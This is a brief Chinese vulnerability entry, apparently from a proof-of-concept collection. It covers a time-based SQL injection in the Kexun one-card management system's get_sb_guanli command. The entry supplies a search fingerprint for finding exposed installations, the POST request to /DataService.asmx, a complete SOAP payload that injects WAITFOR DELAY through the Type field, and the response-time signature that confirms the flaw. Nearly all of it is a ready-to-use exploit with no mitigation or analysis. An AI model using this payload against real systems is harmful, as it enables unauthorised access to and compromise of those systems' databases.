# 科讯一卡通管理系统get_sb_guanli存在SQL注入漏洞

科讯一卡通管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="[http://www.ahkxsoft.com/"`
- **请求**：`POST /DataService.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<ExeAppCmd xmlns="http://tempuri.org/">
<str>{"cmd":"get_sb_guanli","Type":"1');WAITFOR DELAY '0:0:5'--"}</str>
<files>MTIz</files>
</ExeAppCmd>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200 响应时间>=5s